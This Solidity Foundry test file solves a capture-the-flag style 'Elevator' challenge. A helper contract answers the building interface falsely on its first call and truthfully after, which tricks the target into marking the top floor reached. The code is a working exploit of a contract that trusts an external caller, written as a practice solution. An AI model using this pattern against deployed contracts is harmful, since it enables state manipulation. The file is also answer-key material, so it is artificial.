// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Elevator, Building} from "../src/11_Elevator.sol";

contract Skyscraper is Building {
    Elevator public elevator;
    bool private top;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }
    
    function goToLastFloor() public {
        elevator.goTo(100);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!top) {
            top = true;
            return false;
        }
        return true;
    }
}

contract TestElevator is Test {
    address public player = address(0xbad);
    Elevator public instance;

    function setUp() public {
        vm.deal(player, 0.001 ether);
        instance = new Elevator();
    }

    function testSolution() public {
        vm.startPrank(player);

        // Your exploit goes here
        Skyscraper building = new Skyscraper(instance);
        building.goToLastFloor();

        vm.stopPrank();
        assertTrue(instance.top());
    }
}
